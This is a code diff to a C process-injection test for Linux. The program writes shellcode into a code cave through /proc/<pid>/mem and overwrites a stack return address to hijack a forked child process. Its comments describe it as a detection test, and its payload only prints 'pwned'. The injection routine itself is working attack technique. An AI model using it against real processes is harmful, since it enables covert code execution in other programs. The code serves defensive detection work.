@@ -6,7 +6,6 @@
 #include <sys/types.h>
 #include <ctype.h>
 #include <elf.h>
-#include <sys/mman.h>
 
 unsigned char shellcode[] = {
     0x48, 0x83, 0xe4, 0xf0,        // and rsp, -16        (stack alignment)
@@ -29,7 +28,7 @@ unsigned char shellcode[] = {
     0x70, 0x77, 0x6e, 0x65, 0x64,  // "pwned"
     0x00                          
 };
-unsigned int shellcode_len = 60;
+unsigned int shellcode_len = sizeof(shellcode);
 
 #define CHUNK_SIZE (size_t)sysconf(_SC_PAGESIZE)
 #define MIN(a, b) (((a) < (b)) ? (a) : (b))
@@ -40,11 +39,10 @@ pid_t create_victim_child_process() {
     if (pid < 0) {
         return 0;
     } else if (pid == 0) {
-        printf("[Victim Process]:  PID = %d\n", getpid());
         sleep(2);
         exit(0);
     }
-    sleep(0.1);
+    usleep(200000);
     return pid;
 }
 
@@ -109,7 +107,7 @@ long get_reg(pid_t pid, const char* reg) {
     int fd = open(path, O_RDONLY);
     if (fd < 0) return -1;
 
-    //try to read registers until theu became available
+    //try to read registers until they become available
     ssize_t bytesRead;
     int i=0;
     while (i < MAX_LOOPS && (bytesRead = pread(fd, buffer, sizeof(buffer) - 1, 0)) > 0) {
@@ -120,6 +118,7 @@ long get_reg(pid_t pid, const char* reg) {
     }
 
     close(fd);
+    if (bytesRead <= 0) return -1;
     buffer[bytesRead] = '\0';
 
     long syscall, rdi, rsi, rdx, r10, r8, r9, rsp, rip;
@@ -237,7 +236,7 @@ long find_return_address(long pid, long rsp) {
     FILE *maps_file = fopen(maps_file_name, "r");
     if (maps_file == NULL) return -1;
 
-    int best_index = 9999; // Teniamo traccia dell'indice più vicino a RSP
+    int best_index = 9999; // Track the index closest to RSP
     long found_ret_addr_location = -1;
 
     //for every region in the memory ...
@@ -279,17 +278,17 @@ int main(int argc, char *argv[]) {
     }
     printf("[+] target PID: %d\n", pid);
 
-    //inject the payload to a writable memory region without execution permissions
     long target_address = find_code_cave(pid, shellcode_len);
     if (target_address == -1) {
         fprintf(stderr, "[-] Code cave not found\n");
         exit(1);
     }
-    printf("[+] Code cave found here: 0x%lx\n", target_address);
+    printf("[+] Code cave found at: 0x%lx\n", target_address);
 
     unsigned char CodeCave[shellcode_len];
-    read_mem(CodeCave, pid, target_address, shellcode_len);
-    printf("[+] Code Cave content before the injection: \n");
+    if (read_mem(CodeCave, pid, target_address, shellcode_len) != 0) 
+        fprintf(stderr, "[!] Warning: failed to read memory\n");
+    printf("[+] Code Cave content before the overwrite: \n");
     print_mem(CodeCave, shellcode_len);
 
     if(write_in_mem(target_address, pid, shellcode, shellcode_len) != (ssize_t)shellcode_len) {
@@ -298,8 +297,9 @@ int main(int argc, char *argv[]) {
     }
     printf("[+] Payload written successfully\n");
 
-    read_mem(CodeCave, pid, target_address, shellcode_len);
-    printf("[+] Code Cave content after the injection: \n");
+    if (read_mem(CodeCave, pid, target_address, shellcode_len) != 0) 
+        fprintf(stderr, "[!] Warning: failed to read memory\n");
+    printf("[+] Code Cave content after the overwrite: \n");
     print_mem(CodeCave, shellcode_len);
 
     // gathering rsp, necessary to find the return address
@@ -316,14 +316,20 @@ int main(int argc, char *argv[]) {
         fprintf(stderr, "[-] Return address not found\n");
         exit(1);
     }
-    printf("[+] Return_address: 0x%lx\n",return_address);
+    printf("[+] Return address: 0x%lx\n",return_address);
 
-    //Overwrite the return address in the stack with the ROP chain
-    if(write_in_mem(return_address, pid, (unsigned char *)&target_address, sizeof(long)) != sizeof(long)) {
+    // overwrite the return address with the address of the code cave
+    if(write_in_mem(return_address, pid, (unsigned char *)&target_address, sizeof(long)) != (ssize_t)sizeof(long)) {
         fprintf(stderr, "[-] Failed to overwrite the return address\n");
         exit(1);
     }
     printf("[+] Return address overwritten successfully\n");
+
+    unsigned char buffer[sizeof(long)];
+    if (read_mem(buffer, pid, return_address, sizeof(long)) != 0)
+        fprintf(stderr, "[!] Warning: failed to read memory\n");
+    printf("[+] Return address slot after the overwrite:\n");
+    print_mem(buffer, sizeof(long));
 
     printf("[+] Injection finished\n");
     exit(0);
@@ -331,8 +337,8 @@ int main(int argc, char *argv[]) {
 
 /**
  * This technique performs control-flow hijacking via Return Address Overwriting.
- * It first identifies a code cave by scanning /proc/[pid]/maps
- * and writes the shellcode into it through /proc/[pid]/mem.
+ * It first identifies a code cave by scanning /proc/<pid>/maps
+ * and writes the shellcode into it through /proc/<pid>/mem.
  * It then inspects the process stack (from the RSP register) to locate the saved return address.
  * By overwriting this stack location with the address of the code cave,
  * the execution is redirected to the payload the moment the CPU executes the next RET instruction.
@@ -340,8 +346,8 @@ int main(int argc, char *argv[]) {
  * Note: this test forks a child process to use as the injection target.
  * This allows the test to run on systems where ptrace_scope=1 (default on most Linux distributions),
  * where a process can only modify the memory of its own descendants.
- * This may differs from a real-world scenario where the attacker targets an arbitrary process,
- * but for the purpose of this test it preserves the detection-relevant behavior: the same syscalls and /proc/[pid]/mem
+ * This may differ from a real-world scenario where the attacker targets an arbitrary process,
+ * but for the purpose of this test it preserves the detection-relevant behavior: the same syscalls and /proc/<pid>/mem
  * access patterns are generated regardless of the relationship between injector and target.
  * 
  * Injection inspired by Ori David in "The Definitive Guide to Linux Process Injection"
